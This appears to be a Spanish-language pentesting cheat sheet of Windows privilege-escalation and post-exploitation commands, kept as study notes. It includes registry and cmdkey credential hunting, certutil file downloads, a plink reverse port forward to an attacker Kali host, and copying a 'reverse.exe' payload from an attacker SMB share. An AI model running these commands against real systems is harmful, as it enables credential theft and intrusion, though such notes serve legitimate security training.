---
title: "Tecnicas Fundamentales Windows - Apuntes-W"
date: 2023-05-05
categories: [Windows, Apuntes-W]
tags: [Windows, Easy]
image: 
  path: assets\img\imagenes\Logos-Windows.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: "Logos-Windows"
---
<style>
  h3 {
    color: #00FF00; /* Puedes cambiar "blue" por cualquier color que desees */
  }
</style>
### Enumeración del sistema

```python
	systeminfo
	
	systeminfo | findstr /B /C: "OS Name" /C: "OS Version" /C: "System Type"
	
	wmic qfe get Caption, Description, HotFixID, InstalledOn #Muestra actualizaciones del sistema
	
	wmic logicaldisk get caption, description, providername #Muestra discos
```
### Enumeración de usuarios

```python
whoami

whoami /priv

whoami /groups

net user

net user <USUARIO>

net localgroup

net localgroup <GRUPO>
```
### Enumeración de red

```python
ip a

ifconfig

route

ip route

aipconfig

ipconfig /all #Información extendida

arp -a

route print

netstat -ano
```
### Búsqueda de archivos

```python
#CMD

where /r c:\ file.txt

#Powershell

Get-ChildItem -Path C:\Myfolder -Filter file.txt -Recurs
```
### Búsqueda de credenciales

```python
#Valores en el registro que contengan la string “password”

reg query HKLM /f password /t REG_SZ /s

#Listar autologon passwords

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

#Lista contraseñas guardadas

cmdkey /list
```
### Enumeración de antivirus

```python
sc query windefend

sc queryex type= service #Lista servicios activos

netsh advfirewall firewall dump
```
### Enumeración con herramientas automáticas

```python
	[Release Release refs/heads/master 20230108 · carlospolop/PEASS-ng (github.com)](https://github.com/carlospolop/PEASS-ng/releases/tag/20230108)
	
	[bitsadmin/wesng: Windows Exploit Suggester - Next Generation (github.com)](https://github.com/bitsadmin/wesng)

````
## Funciones básicas

### Descarga de archivos[](#descarga-de-archivos)

```python
certutil.exe -urlcache -f <URL> <OUTPUT_FILE>
```
### Comprobación de permisos sobre un archivo

```python
accesschk.exe /accepteula -quvw <user> <Ruta absoluta del archivo>
```
### Ejecución de un programa como otro usuario en Powershell

```python
powershell -c "$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<USER>', $password);Start-Process -FilePath "<PROGRAM.EXE>" -Credential $creds"
```
### Windows Port Forwarding

```python
plink.exe -l <KALI_USER> -pw <KALI_USER_PASS> -R <KALI_PORT>:<LOCAL_IP/LOCALHOST_IP>:<LOCAL_PORT> <KALI_IP>
```
### Transferencia de archivos mediante smb

```python
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . #Kali

copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe #Windows
```
### Desencriptado GPP

```python
gpp-decrypt "<hash>"
```
